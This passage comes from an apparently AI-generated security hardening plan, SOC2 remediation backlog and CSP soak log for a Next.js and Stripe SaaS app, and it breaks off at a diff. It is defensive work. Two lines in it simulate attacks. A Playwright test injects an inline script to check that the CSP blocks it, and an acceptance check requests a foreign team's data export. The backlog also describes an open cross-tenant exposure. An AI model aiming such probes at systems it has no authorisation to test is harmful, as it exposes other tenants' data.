| 4 | Error handling — strip stack traces | \`errors.no-stack-trace\` | 0.25d | code |
| 5 | Cookie \`__Host-\` prefix + \`SameSite=Strict\` | \`cookies.session.host-prefix\` | 0.75d | code |
| 6 | Admin audit log | \`audit.admin-log\` | 1.5d | code + migration |
| 7 | Evidence capture + \`harden:verify\` in CI | — | 0.25d | ops |
| 8 | Remaining Cloudflare Free toggles | — | 0.5d | dashboard |
| | **Total** | | **6.5d** | **1.5d dashboard** |

This 6.5d is the hardening scope only. The remediation backlog's larger total
(13.25d) adds B-1 (5.0d, code-auditor Fixer work, not hardening), the compliance
documents (1.0d) and the defence-in-depth items outside this plan (0.75d).

## 1. Content-Security-Policy — \`headers.csp\`

Ship a nonce-based CSP in **report-only mode for 7 days** before enforcing. The
soak is not ceremony: on a Next.js + Stripe app the first report-only day always
returns thousands of violations, and almost all of them are bugs in the policy.

### 1.1 The header

\`\`\`
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self' 'nonce-{{nonce}}' https://js.stripe.com;
  style-src 'self' 'nonce-{{nonce}}';
  style-src-attr 'unsafe-inline';
  img-src 'self' data: blob: https://*.supabase.co;
  connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co https://*.ingest.sentry.io;
  frame-src https://js.stripe.com https://hooks.stripe.com;
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report;
  report-to csp;

Reporting-Endpoints: csp="/csp-report"
\`\`\`

Three things that are easy to get wrong and are called out here because the first
draft of this plan got all three wrong (see the soak report):

- **Stripe.js is served from \`js.stripe.com\`, not \`cdn.stripe.com\`.** The CDN host serves Stripe's marketing assets; the SDK does not load from it.
- **Stripe's API host is \`api.stripe.com\`.** Checkout's client-side calls go there.
- **\`style-src-attr 'unsafe-inline'\` is required.** \`next/image\` emits \`style="color:transparent"\` as an *attribute*, and a nonce cannot cover attributes. The alternatives are per-attribute hashes (unmaintainable) or dropping \`next/image\`. Documented as an accepted narrowing: \`style-src\` itself stays nonce-only, so stylesheet injection is still blocked.

\`report-uri\` is deprecated but still the only directive Safari honours, so both
it and \`report-to\` ship.

### 1.2 Middleware — nonce on the *request*

The nonce has to reach \`app/layout.tsx\`, and a Server Component reads
**request** headers via \`headers()\`. Setting it only on the response (as the
first draft did) means \`layout.tsx\` reads \`null\` and every \`<script>\` violates
on day 1.

\`\`\`ts
// middleware.ts
import { NextResponse, type NextRequest } from "next/server";

const REPORT_ONLY = process.env.CSP_ENFORCE !== "true";

export function middleware(req: NextRequest) {
  const nonce = Buffer.from(crypto.getRandomValues(new Uint8Array(16))).toString("base64");

  const csp = [
    "default-src 'self'",
    \`script-src 'self' 'nonce-\${nonce}' https://js.stripe.com\`,
    \`style-src 'self' 'nonce-\${nonce}'\`,
    "style-src-attr 'unsafe-inline'", // next/image emits style="color:transparent"
    "img-src 'self' data: blob: https://*.supabase.co",
    "connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co https://*.ingest.sentry.io",
    "frame-src https://js.stripe.com https://hooks.stripe.com",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    "report-uri /csp-report",
    "report-to csp",
  ].join("; ");

  // Forward the nonce on the REQUEST so Server Components can read it.
  const requestHeaders = new Headers(req.headers);
  requestHeaders.set("x-nonce", nonce);

  const res = NextResponse.next({ request: { headers: requestHeaders } });

  res.headers.set(
    REPORT_ONLY ? "content-security-policy-report-only" : "content-security-policy",
    csp,
  );
  res.headers.set("reporting-endpoints", 'csp="/csp-report"');

  // headers.baseline — §1.5
  res.headers.set("referrer-policy", "strict-origin-when-cross-origin");
  res.headers.set("permissions-policy", "camera=(), microphone=(), geolocation=(), interest-cohort=()");
  res.headers.set("cross-origin-opener-policy", "same-origin");
  res.headers.set("cross-origin-resource-policy", "same-origin");

  return res;
}

export const config = {
  matcher: ["/((?!_next/static|_next/image|favicon.ico|csp-report).*)"],
};
\`\`\`

\`\`\`tsx
// app/layout.tsx
import { headers } from "next/headers";

export default async function RootLayout({ children }: { children: React.ReactNode }) {
  const nonce = (await headers()).get("x-nonce") ?? undefined;
  return (
    <html lang="en">
      <body>
        {children}
        <Script src="https://js.stripe.com/v3/" nonce={nonce} strategy="afterInteractive" />
      </body>
    </html>
  );
}
\`\`\`

### 1.3 \`/csp-report\` route handler

\`\`\`ts
// app/csp-report/route.ts
import { NextResponse } from "next/server";
import * as Sentry from "@sentry/nextjs";
import { rateLimit } from "@/lib/rate-limit";

export async function POST(req: Request) {
  // Drop silently above 50/min/IP — a report endpoint is a free amplifier.
  const ip = req.headers.get("cf-connecting-ip") ?? "unknown";
  if (!(await rateLimit({ key: \`csp:\${ip}\`, limit: 50, windowSec: 60 }))) {
    return new NextResponse(null, { status: 204 });
  }

  let body: unknown;
  try { body = await req.json(); } catch { return new NextResponse(null, { status: 204 }); }

  Sentry.captureMessage("csp_violation", {
    level: "warning",
    extra: { report: body, ip, user_agent: req.headers.get("user-agent") },
    tags: { kind: "csp" },
  });

  return new NextResponse(null, { status: 204 });
}
\`\`\`

### 1.4 Regression tests

One Vitest test and two Playwright tests gate every PR.

\`\`\`ts
// tests/security/csp.spec.ts — Vitest (header shape only)
test("csp-header-present-and-nonced", async () => {
  const res = await fetch(\`\${STAGING}/\`);
  const csp = res.headers.get("content-security-policy-report-only")
    ?? res.headers.get("content-security-policy");
  expect(csp).toMatch(/script-src [^;]*'nonce-[A-Za-z0-9+/]{20,}={0,2}'/);
  expect(csp).toContain("https://js.stripe.com");
  expect(csp).not.toContain("cdn.stripe.com");
});
\`\`\`

\`\`\`ts
// e2e/security/csp.spec.ts — Playwright (real browser, real enforcement)
test("csp-blocks-inline-script", async ({ page }) => {
  const errors: string[] = [];
  page.on("console", (m) => m.type() === "error" && errors.push(m.text()));
  await page.goto("/");
  await page.addScriptTag({ content: "window.__pwned = true" }).catch(() => {});
  expect(errors.join("\\n")).toMatch(/refused to execute inline script/i);
  expect(await page.evaluate(() => (window as any).__pwned)).toBeUndefined();
});

test("stripe-checkout-survives-csp", async ({ page }) => {
  await page.goto("/billing");
  await page.getByRole("button", { name: "Upgrade" }).click();
  await expect(page.frameLocator("iframe[name^='__privateStripeFrame']")
    .getByText("Card number")).toBeVisible();
});
\`\`\`

The second one exists because the cheapest way to ship a CSP that breaks
checkout is to test it on a page that has no Stripe on it.

### 1.5 The other six headers — \`headers.baseline\`

| Header | Before | After |
|---|---|---|
| \`Content-Security-Policy\` | absent | nonce-based (report-only → enforce) |
| \`Strict-Transport-Security\` | absent | \`max-age=300\` → \`max-age=63072000; includeSubDomains\` |
| \`X-Content-Type-Options\` | \`nosniff\` | \`nosniff\` (no change) |
| \`X-Frame-Options\` | \`SAMEORIGIN\` | \`DENY\` (CSP \`frame-ancestors 'none'\` is authoritative; this is the legacy fallback) |
| \`Referrer-Policy\` | absent | \`strict-origin-when-cross-origin\` |
| \`Permissions-Policy\` | absent | \`camera=(), microphone=(), geolocation=(), interest-cohort=()\` |
| \`Cross-Origin-Opener-Policy\` | absent | \`same-origin\` |
| \`Cross-Origin-Resource-Policy\` | absent | \`same-origin\` |

**Header score: 2/8 → 8/8** once CSP enforces; **7/8** while it is report-only.

## 2. TLS + DNS — \`cf.tls.min\`, \`headers.hsts\`, \`dns.caa\`

| Setting | Current | Target | Where |
|---|---|---|---|
| Cloudflare SSL mode | Full | **Full (strict)** | dashboard — origin already presents a valid Vercel cert |
| Minimum TLS version | 1.0 | **1.2** | dashboard — available on Free |
| HSTS | off | \`max-age=300\` first, \`max-age=63072000; includeSubDomains\` after 7 stable days | dashboard |
| HSTS preload | off | **not submitted** | see §2.1 |
| CAA | absent | \`0 issue "letsencrypt.org"\`, \`0 issue "pki.goog"\`, \`0 iodef "mailto:security@headsdown.app"\` on \`headsdown.app\` | dashboard |

### 2.1 On \`includeSubDomains\` and preload

\`includeSubDomains\` applies to every host under \`headsdown.app\`, including the
ones that are not this app:

\`\`\`
$ dig +short status.headsdown.app
headsdown.statuspage.io.
$ dig +short docs.headsdown.app
hosting.gitbook.io.
$ dig +short mail.headsdown.app
pm.mtasv.net.
$ for h in status docs; do curl -sI "https://$h.headsdown.app" | head -1; done
HTTP/2 200
HTTP/2 200
\`\`\`

Both web subdomains serve valid HTTPS, so \`includeSubDomains\` is safe. \`mail.\`
has no web listener and is unaffected. **Preload is not submitted** — removal
from the preload list takes months and browsers ship it in a release cycle, so
it is the one change here with no practical rollback. Revisit after the audit.

## 3. WAF + rate-limit — \`cf.waf.ratelimit.auth\`, \`cf.bot-fight\`

### 3.1 Plan tier

| Control | Plan required | Decision |
|---|---|---|
| Cloudflare Managed Ruleset | **Pro** ($20/mo) | **Accepted risk** until after fieldwork — D-5, revisit 2026-11 |
| OWASP Core Rule Set | **Pro** | same as above |
| Rate Limiting Rules | Free — **one rule** | spend it on \`/api/auth/*\` |
| Bot Fight Mode | Free | on |
| Security Level | Free | medium → high |
| Managed Challenge action | Free | used by the one rule |

Free gets exactly one rate-limiting rule. It goes on the unauthenticated auth
surface, because that is where F-004 lives.

### 3.2 The one rule

\`\`\`
Rule name    auth-burst
Expression   (http.request.uri.path wildcard "/api/auth/*")
Characteristic  ip.src
Rate         10 requests / 1 minute
Action       Managed Challenge
Duration     10 minutes
\`\`\`

Managed Challenge, not Block, and not 429: a block on a login path takes out
every user behind one office NAT. A challenge lets a human through.

**Verify:** send 11 requests in under a minute; the 11th returns the interstitial —
\`HTTP/2 403\` with \`cf-mitigated: challenge\`. A 429 would mean the rule was
configured with the Block action by mistake.

Application-side, \`/api/auth/magic-link\` also gets a 10/hour/email limit, which
the edge rule cannot express.

## 4. Error handling — \`errors.no-stack-trace\`

\`\`\`tsx
// app/global-error.tsx
"use client";
export default function GlobalError({ error }: { error: Error & { digest?: string } }) {
  return (
    <html>
      <body>
        <h1>Something went wrong</h1>
        <p>Reference: <code>{error.digest ?? "unknown"}</code></p>
        <p>Please try again. If it keeps happening, send us that reference.</p>
      </body>
    </html>
  );
}
\`\`\`

\`error.digest\` is Next's stable correlation id; the full trace stays in Sentry
and is searchable by it. **Verify:** \`tests/security/no-stack-trace-in-500.spec.ts\`
forces a 500 and asserts the body contains neither \`/var/task\` nor \`webpack://\`.

## 5. Cookie hardening — \`cookies.session.host-prefix\`

| Attribute | Current | Target |
|---|---|---|
| name | \`session\` | \`__Host-session\` (forces \`Secure\`, \`Path=/\`, no \`Domain\`) |
| \`SameSite\` | \`Lax\` | \`Strict\` |
| \`Secure\` / \`HttpOnly\` | yes / yes | unchanged |
| rotation on privilege change | yes | unchanged |

**Scheduling note.** Renaming the cookie invalidates every live session — all
~1,900 seats sign out at once. That is not a change to make during audit
preparation. Scheduled for **2026-10-27, 03:00 UTC** (the Tuesday after
fieldwork opens), with an in-app banner 48 hours ahead.

\`SameSite=Strict\` breaks the OAuth callback, which arrives as a cross-site
top-level navigation. Mitigation: the callback path sets a one-shot \`Lax\`
cookie that is exchanged for the \`Strict\` one on the first same-site request.

## 6. Admin audit log — \`audit.admin-log\`

One data layer: Supabase SQL, snake_case, no ORM. (The first draft of this plan
contained a Prisma model; this codebase has no Prisma.)

\`\`\`sql
-- supabase/migrations/20260915_admin_audit_log.sql
create table public.admin_audit_log (
  id            uuid primary key default gen_random_uuid(),
  actor_id      uuid not null references auth.users(id),
  action        text not null,          -- impersonate | plan_change | team_transfer | ...
  target_type   text not null,
  target_id     text not null,
  before        jsonb,
  after         jsonb,
  ip_address    inet not null,
  user_agent    text,
  success       boolean not null,
  reason        text,
  created_at    timestamptz not null default now()
) partition by range (created_at);

create index on public.admin_audit_log (actor_id, created_at desc);
create index on public.admin_audit_log (target_type, target_id, created_at desc);

alter table public.admin_audit_log enable row level security;
create policy admin_audit_log_no_client_read on public.admin_audit_log
  for select using (false);   -- service-role / SQL console only

select partman.create_parent(
  p_parent_table => 'public.admin_audit_log',
  p_control      => 'created_at',
  p_type         => 'native',
  p_interval     => 'monthly',
  p_premake      => 3
);

-- Retention: 1 year, per docs/security/retention-policy.md.
-- SOC2 mandates no specific period; one year is our stated policy and CC7.2
-- only requires that monitoring covers the period under evaluation.
select cron.schedule(
  'admin_audit_log_retention', '17 3 * * *',
  $$ select partman.drop_partition_time('public.admin_audit_log', '1 year', false) $$
);
\`\`\`

\`\`\`ts
// src/lib/admin/audit.ts
export async function logAdminAction(opts: {
  actorId: string; action: string; targetType: string; targetId: string;
  before?: unknown; after?: unknown; ipAddress: string; userAgent?: string;
  success: boolean; reason?: string;
}) {
  const { error } = await admin.from("admin_audit_log").insert({
    actor_id: opts.actorId,
    action: opts.action,
    target_type: opts.targetType,
    target_id: opts.targetId,
    before: opts.before ?? null,
    after: opts.after ?? null,
    ip_address: opts.ipAddress,
    user_agent: opts.userAgent ?? null,
    success: opts.success,
    reason: opts.reason ?? null,
  });
  if (error) Sentry.captureException(error, { tags: { kind: "audit-log-write" } });
}
\`\`\`

All 6 admin entry points call it after the action settles, success or failure.
**Verify:** \`tests/admin/audit-log-coverage.spec.ts\` walks every route file under
\`app/admin/\` and fails if one does not reach \`logAdminAction\`.

## 7. Cloudflare settings — Free plan reality

| Setting | Current | Target | Available on Free |
|---|---|---|---|
| SSL mode | Full | Full (strict) | yes |
| Minimum TLS | 1.0 | 1.2 | yes |
| HSTS | off | on, staged | yes |
| Managed WAF ruleset | n/a | **deferred (Pro)** | no |
| Rate limiting | off | 1 rule, \`/api/auth/*\` | yes, one rule |
| Bot Fight Mode | off | on | yes |
| Security Level | medium | high | yes |
| Always Use HTTPS | on | on | yes |
| Email obfuscation | off | on | yes |
| Hotlink protection | off | on | yes |

## 8. Checklist

Each line carries its control id, so \`/oc-harden verify\` can check it later.

- [ ] \`headers.csp\` — middleware + nonce plumbing + \`/csp-report\` (1.0d).
  - **verify:** \`curl -sI https://app.headsdown.app | grep -i content-security-policy-report-only\` and the nonce matches the one in the HTML.
- [ ] \`headers.csp\` — 7-day soak, triage, enforce (1.0d).
  - **verify:** \`/oc-harden status\` reports 0 unexplained violations across 7 consecutive days.
- [ ] \`headers.baseline\` — six headers in middleware (0.25d).
  - **verify:** the §1.5 table, all rows present.
- [ ] \`cf.tls.min\` — Minimum TLS → 1.2 (10 min).
  - **verify:** \`openssl s_client -tls1_1 -connect app.headsdown.app:443 </dev/null\` is refused.
- [ ] \`headers.hsts\` — \`max-age=300\`, then 2y after 7 days (15 min + wait).
  - **verify:** \`strict-transport-security\` present on every route.
- [ ] \`dns.caa\` — CAA records on \`headsdown.app\` (10 min).
  - **verify:** \`dig CAA headsdown.app +short\` returns the three records.
- [ ] \`cf.waf.ratelimit.auth\` — the one Free rate-limit rule (20 min).
  - **verify:** 11 requests in 60s → \`403\` with \`cf-mitigated: challenge\`.
- [ ] \`cf.bot-fight\` — Bot Fight Mode + Security Level high (10 min).
  - **verify:** Cloudflare Security Events shows BFM actions on synthetic bot traffic.
- [ ] \`errors.no-stack-trace\` — replace \`global-error.tsx\` (2h).
  - **verify:** \`tests/security/no-stack-trace-in-500.spec.ts\` green against staging.
- [ ] \`cookies.session.host-prefix\` — **deferred to 2026-10-27 03:00 UTC** (0.75d).
  - **verify:** \`Set-Cookie: __Host-session=…; Secure; HttpOnly; SameSite=Strict; Path=/\`.
- [ ] \`audit.admin-log\` — migration + wrapper + 6 call-sites (1.5d).
  - **verify:** \`tests/admin/audit-log-coverage.spec.ts\`, plus one real row in staging.
- [ ] CI wiring — \`npm run harden:verify\` in \`.github/workflows/ci.yml\` (0.25d).
  - **verify:** the workflow fails when a control regresses. Until this lands, \`gate.machine_enforced\` is \`false\`.

## 9. 7-day soak calendar

The clock restarts from day 1 whenever a policy change ships, because a soak on
a policy nobody has run for a week proves nothing.

| Day | State | Watch | Restart trigger |
|---|---|---|---|
| 1 | report-only shipped | violation rate by directive | any directive fix |
| 2-3 | unchanged | new \`blocked-uri\` values | any directive fix |
| 4-5 | unchanged | rate by browser + extension noise | any directive fix |
| 6-7 | unchanged | weekend baseline (real traffic only) | any directive fix |
| 8 | **enforce** (\`CSP_ENFORCE=true\`) | user-reported breakage for 24h | roll back to report-only |

Known benign noise that does **not** restart the clock: \`chrome-extension://\`
and \`moz-extension://\` blocked-uris. Those are the user's browser, not the app.

## 10. Rollback

| Change | Revert | Time | User-visible |
|---|---|---|---|
| CSP enforced | \`CSP_ENFORCE=false\` + redeploy | < 5 min | none — back to report-only |
| CSP middleware | revert PR | < 10 min | none |
| \`headers.baseline\` | revert PR | < 10 min | none |
| SSL Full (strict) | dashboard toggle | < 1 min | none while the origin cert is valid |
| Min TLS 1.2 | dashboard toggle | < 1 min | breaks clients stuck on TLS 1.0/1.1 |
| HSTS | serve \`max-age=0\` | < 5 min to change, but clients that already cached a long \`max-age\` will not attempt HTTP again until it expires — which is exactly why \`max-age=300\` ships first. **Preload is the irreversible part**, and it is not being submitted. | none if the site stays on HTTPS |
| CAA | delete records | < 30 min (TTL) | none unless issuing a new cert |
| Rate-limit rule | dashboard toggle | < 1 min | bursts stop being challenged |
| Bot Fight Mode | dashboard toggle | < 1 min | none |
| \`__Host-\` cookie rename | revert PR | < 10 min | **every session invalidated again** |
| Admin audit log | revert PR, keep table | < 10 min | none |

Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\` (pillar 3 complete,
handed to oc-security-hardening).`,
    },
    {
      id: "remediation-backlog",
      label: "Remediation backlog — SEC-101…SEC-112",
      kind: "backlog.md",
      body:
`# Remediation Backlog — SOC2 Type I prep

**Produced by** oc-security-auditor from SA-001…SA-008 + oc-code-auditor F-001…F-006 · **Date:** 2026-09-14 (re-planned same day after capacity review) · **Fieldwork opens:** 2026-10-26 · **Linear project:** \`security-soc2-prep\` (SEC-101…SEC-112)

**Total effort: 13.25 engineering days.**

| Block | Days | Where it is specified |
|---|---|---|
| B-1 — per-tenant JWT + RLS | 5.00 | oc-code-auditor F-001 (Fixer work) |
| Runtime hardening | 6.50 | hardening plan §0 ledger (1.5d of it is dashboard toggles) |
| Compliance documents | 1.00 | B-3, B-4, B-5 — oc-compliance-ops |
| Defence-in-depth outside the hardening plan | 0.75 | D-2, D-3 |

Capacity is **founder 5 days/week + contractor 2 days/week (Tue/Wed)**. That is
7 person-days a week, which is why Sprint A is two weeks long: B-1 alone does not
fit in one.

## 1. Tiers

| Tier | Definition | SLA |
|---|---|---|
| **B (Type I blocker)** | Makes a signed control statement untrue, or leaves a Prescient checklist line empty | Before 2026-10-26 |
| **C (real gap, not a Type I control)** | Genuine security debt; an auditor will not test it, an attacker might | Sprint A / B |
| **D (defence-in-depth)** | Layered protection; no single-point exposure today | Sprint B or deferred |
| **H (hygiene)** | Process and cadence | Ongoing |

## 2. B — Type I blockers

### B-1 — Per-tenant JWT + RLS on all 14 tables

| | |
|---|---|
| **Ticket** | SEC-101 (\`incident\`, \`severity:CRITICAL\`, \`compliance:soc2\`) |
| **Source** | SA-001 · F-001 · F-003 · F-005 |
| **Route** | \`/oc-audit fix F-001\` (oc-code-auditor Fixer — this changes the authz path, not the runtime config) |
| **Owner** | founder + contractor |
| **Est** | **5.0 days** |
| **Point of focus** | CC6.1, CC6.7 |

**Estimate breakdown** (the original "1-2 days" was wrong by a factor of three):

| Task | Days | Who |
|---|---|---|
| Mint per-request JWT with a \`team_id\` claim; wire into the Supabase client factory | 0.5 | founder |
| 14 RLS policies + \`enable row level security\` migration, one \`tenant_isolation\` policy per table | 1.5 | contractor |
| Rewrite 23 call-sites to \`getSupabase(userJwt)\`; delete the \`?team_id\` fallback on \`/api/export\` | 2.0 | founder |
| \`tests/security/cross-tenant.spec.ts\` — asserts 0 rows for every tenant-scoped endpoint under a foreign session | 1.0 | contractor |

**Acceptance**

- [ ] No file under \`app/**\` imports \`@/lib/supabase/server\`; ESLint \`no-restricted-imports\` enforces it, with zero \`eslint-disable\` grandfathers.
- [ ] \`select count(*) from pg_tables where schemaname='public' and rowsecurity=false\` returns 0 for the 14 tenant tables.
- [ ] \`tests/security/cross-tenant.spec.ts\` green across all 8 tenant-scoped endpoints.
- [ ] \`GET /api/export?team_id=<foreign>\` returns 0 rows, not 403 — the policy filters, it does not error.

**Rollback:** fix-forward only. Reverting restores the CRITICAL. The JWT issuance
commit is separable from the policy migration, so a bad JWT change can be
reverted without dropping RLS.

**Evidence for the auditor:** \`docs/security/evidence/sec-101-rls-coverage.txt\`
(the \`pg_tables\` query output) plus the passing cross-tenant test run.

### B-2 — Admin audit log

| | |
|---|---|
| **Ticket** | SEC-102 · **Source** SA-007, F-006 · **Route** \`/oc-harden fix SA-007\` · **Owner** founder · **Est** 1.5d · **PoF** CC7.2 |

Promoted from C-tier: CC7.2 asks for monitoring of privileged action and there
is currently nothing to show. Schema, wrapper and the 6 call-sites are specified
in hardening plan §6. Retention is **1 year** per
\`docs/security/retention-policy.md\` — SOC2 mandates no specific period, and the
7-year figure that appeared in the first draft is a SOX number.

**Acceptance:** migration applied; all 6 admin routes covered by
\`tests/admin/audit-log-coverage.spec.ts\`; one real staging row with before/after
snapshots exported to \`docs/security/evidence/sec-102-sample-event.json\`.

### B-3 — Commit the threat model

| | |
|---|---|
| **Ticket** | SEC-103 · **Source** H-1 · **Route** \`/oc-comply policies\` · **Owner** founder · **Est** 0.25d · **PoF** CC3.2 |

The posture report → \`docs/security/threat-model.md\`, plus a quarterly review
entry in \`.opchain/compliance.yaml\`. The document exists; this is the commit and
the cadence.

### B-4 — Subprocessor register + DPA status

| | |
|---|---|
| **Ticket** | SEC-104 · **Source** H-2 · **Route** \`/oc-comply policies\` · **Owner** founder · **Est** 0.5d · **PoF** CC9.2 |

Cloudflare, Vercel, Supabase, Stripe, Sentry. Three DPAs are on file; Supabase
and Sentry need countersigning. Register at \`docs/security/subprocessors.md\`.

### B-5 — Incident-response drill + record

| | |
|---|---|
| **Ticket** | SEC-105 · **Source** H-4 (new) · **Route** \`/oc-comply policies\` · **Owner** founder · **Est** 0.25d · **PoF** CC7.3 |

The runbook exists and has never been exercised. One tabletop against the
SA-001 scenario, two hours, written up to
\`docs/security/evidence/sec-105-drill-2026-09-24.md\`. CC7.3 wants evidence of
evaluation, not a perfect response.

## 3. C — real gaps, not Type I controls

### C-1 — Strip stack traces from production 500s

**Ticket** SEC-106 · **Source** SA-004, F-002 · **Route** \`/oc-audit fix F-002\` ·
**Owner** founder · **Est** 0.25d.

Acceptance: production 500 body contains no \`/var/task\` or \`webpack://\`
substring; \`tests/security/no-stack-trace-in-500.spec.ts\` green.

### C-2 — Content-Security-Policy

**Ticket** SEC-107 · **Source** SA-002 · **Route** \`/oc-harden csp\` ·
**Owner** founder · **Est** 2.0d (1.0 build + soak, 1.0 triage + enforce).

**Re-tiered from B to C on 2026-09-14.** CSP is not a SOC2 control. It is
CC6.6-adjacent evidence at best, and Prescient's Type I checklist does not
mention it. It stays high on the list because it is the control that makes an
XSS survivable, not because an auditor will ask.

Report-only ships in Sprint A; the enforce flip is Sprint B, after the 7-day
soak completes (see the soak log — the clock restarted once already).

### C-3 — Edge controls on the unauthenticated surface

**Ticket** SEC-108 · **Source** SA-003, F-004 · **Route** \`/oc-harden fix SA-003\` ·
**Owner** founder · **Est** 1.0d.

One Cloudflare rate-limit rule on \`/api/auth/*\` (10/min/IP, Managed Challenge),
Bot Fight Mode on, Security Level → high, email obfuscation + hotlink protection
on. Managed WAF ruleset is **not** included — see D-5.

### C-4 — TLS, HSTS, CAA, and the six missing headers

**Ticket** SEC-109 · **Source** SA-003 (TLS 1.0), header sweep 2/8 ·
**Route** \`/oc-harden fix cf.tls.min headers.hsts dns.caa headers.baseline\` ·
**Owner** founder · **Est** 1.0d.

Includes wiring \`npm run harden:verify\` into \`.github/workflows/ci.yml\`, which
is what flips \`gate.machine_enforced\` to \`true\` (CC8.1).

## 4. D — defence-in-depth

### D-1 — \`__Host-\` cookie prefix + \`SameSite=Strict\`

**Ticket** SEC-110 · **Source** SA-005 · **Route** \`/oc-harden fix SA-005\` ·
**Owner** founder · **Est** 0.75d · **Deferred to 2026-10-27 03:00 UTC.**

The rename signs out ~1,900 seats at once. Doing that in the week before
fieldwork trades a MEDIUM finding for a support queue and a bad first impression.
Scheduled for the Tuesday after fieldwork opens, with a 48-hour in-app banner.

### D-2 — Stripe webhook origin check

**Ticket** SEC-111 · **Source** SA-008 · **Owner** founder · **Est** 0.25d.

HMAC verification is already correct; this adds an origin check against Stripe's
published ranges as a second layer. Ships in Sprint A because it is two hours
and closes the last LOW.

### D-3 — Admin authorisation at the data layer

**Ticket** SEC-112 · **Source** SA-006 · **Owner** founder · **Est** 0.5d ·
Sprint B.

An \`is_admin\` claim in the same JWT B-1 introduces, plus a policy on the admin
views. Cheap once B-1 exists; impossible before it.

### D-4 — Remaining Cloudflare Free toggles

No ticket. Email obfuscation, hotlink protection, Security Level. Folded into
C-3's dashboard session. 10 minutes.

### D-5 — Cloudflare Managed WAF ruleset + OWASP CRS

**No ticket — accepted risk.** Both require the **Pro** plan ($20/month). The
decision is not the money; it is that changing plan tiers reshuffles edge
behaviour, and doing that during audit preparation means every subsequent odd
result has two possible causes. Recorded in \`.opchain/hardening.yaml\` as
\`cf.waf.managed-ruleset: {stage: accepted_risk, revisit: 2026-11}\`. The
compensating controls are C-3's rate-limit rule and Bot Fight Mode.

## 5. H — hygiene

- **H-3** — quarterly \`/oc-security posture\` re-run; calendar entry + \`.opchain/compliance.yaml\` review cadence. 5 minutes.
- **H-5** — pen test booked for the week of 2026-11-09, after Sprint B closes. Booking, not conducting; a pen test run before B-1 would only rediscover SA-001.

## 6. Sprint plan

Capacity: founder 5d/week, contractor 2d/week (Tue/Wed).

**Sprint A — 2026-09-15 → 2026-09-25 (two weeks, 14 person-days available, 11.0 planned)**

| Item | Days | Owner |
|---|---|---|
| B-1 (JWT + 23 routes) | 2.0 | founder |
| B-1 (14 policies + cross-tenant test) | 3.0 | contractor |
| B-2 admin audit log | 1.5 | founder |
| B-3 / B-4 / B-5 compliance docs + drill | 1.0 | founder |
| C-1 stack traces | 0.25 | founder |
| C-2 CSP report-only + soak triage | 1.0 | founder |
| C-3 edge controls | 1.0 | founder |
| C-4 TLS / HSTS / CAA / headers / CI | 1.0 | founder |
| D-2 Stripe origin check | 0.25 | founder |
| **Planned** | **11.0** | 3.0 days of slack, deliberately |

**Sprint B — 2026-09-28 → 2026-10-09**

| Item | Days | Owner |
|---|---|---|
| C-2 CSP enforce flip | 1.0 | founder |
| D-3 admin claim at the data layer | 0.5 | founder |
| \`/oc-comply evidence\` bundle for the auditor | 0.5 | founder |
| H-5 pen-test booking | 0.1 | founder |

Sprint B is deliberately light. The two weeks between Sprint B closing and
fieldwork opening are for the evidence bundle, the re-score, and answering
Prescient's pre-fieldwork questionnaire.

**Deferred past fieldwork:** D-1 (2026-10-27), D-5 (revisit 2026-11).

Every item ships through the normal chain — build → oc-code-auditor →
oc-security-auditor → \`/oc-harden verify\` → oc-deploy-ops. No direct-to-prod
patches during audit prep; an unreviewed hotfix is a CC8.1 finding by itself.

## 7. Tracking

Linear project \`security-soc2-prep\`. SEC-101 was filed as an \`incident\`-type
issue (labels \`security\`, \`incident\`, \`severity:CRITICAL\`, \`compliance:soc2\`)
because a CRITICAL finding in the authz path is an open exposure, not a backlog
item. Closing any ticket requires the PR plus the \`/oc-security compare\` output
as a comment.

## 8. Communication

| Audience | When | What |
|---|---|---|
| Contractor | Tue/Wed stand-up | which B-1 slice is theirs that week |
| Investors | **end of Sprint B** | "Type I blockers closed, fieldwork scheduled for 2026-10-26." Not "SOC2-ready" — that phrase is not true until a report exists, and Sales has already used it once. |
| Customers | incident only | no proactive comms during prep |
| Prescient | 2026-10-12 | evidence bundle (§9) |

## 9. Definition of "fieldwork-ready"

All B-tier closed. C-tier closed or with a written accepted-risk decision in
\`.opchain/hardening.yaml\`. D-5 recorded as accepted risk. Subprocessor register
filed with DPA status. One IR drill on record. Pen test booked.

The auditor packet itself is **not** produced by this skill — \`/oc-comply evidence\`
builds it at \`docs/compliance/evidence/2026-10-12-<sha>/index.md\`, with the
control register, the evidence index, and the mandatory "readiness mapping, not
certification" statement.

Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\`.`,
    },
    {
      id: "csp-soak-report",
      label: "CSP report-only soak — day 1 and day 8",
      kind: "soak-log.md",
      body:
`# CSP report-only soak — heads-down-app

**Control:** \`headers.csp\` · **Executed by** oc-security-hardening (\`/oc-harden csp\`) · **Shipped:** 2026-09-16 09:40Z · **Clock restarted:** 2026-09-17 · **Enforce approved:** 2026-09-24

## Day 1 — 2026-09-17 03:52Z (18h after ship)

\`\`\`
$ /oc-harden status headers.csp

 control          headers.csp
 stage            report-only
 window           2026-09-16T09:40Z → 2026-09-17T03:52Z  (18h12m)
 reports received 4,212
 unique blocked-uri  7
 real gaps           0
 policy errors       3
\`\`\`

| Directive | Blocked URI | Count | Verdict |
|---|---|---|---|
| \`script-src\` | \`https://js.stripe.com/v3/\` | 2,981 | **policy error** — the plan allow-listed \`cdn.stripe.com\`. Stripe.js is served from \`js.stripe.com\`; \`cdn.stripe.com\` serves marketing assets this app never loads. |
| \`style-src-attr\` | \`inline\` | 1,190 | **policy error** — \`next/image\` emits \`style="color:transparent"\` as an attribute. A nonce covers elements, not attributes. |
| \`connect-src\` | \`https://api.stripe.com\` | 41 | **policy error** — the draft policy said \`oc-api.stripe.com\`, which is not a host. |
| \`script-src\` | \`chrome-extension://…\` (4 ids) | 0 | not counted — extension noise is filtered before the table, see §Known noise |
| — | — | **4,212** | **0 real gaps** |

Zero real gaps is the finding. Nothing in the application tried to do anything a
strict CSP should stop. Every violation was this document being wrong about a
hostname or about how nonces interact with \`next/image\`.

### Fixes applied — 2026-09-17 04:10Z

\`\`\`diff
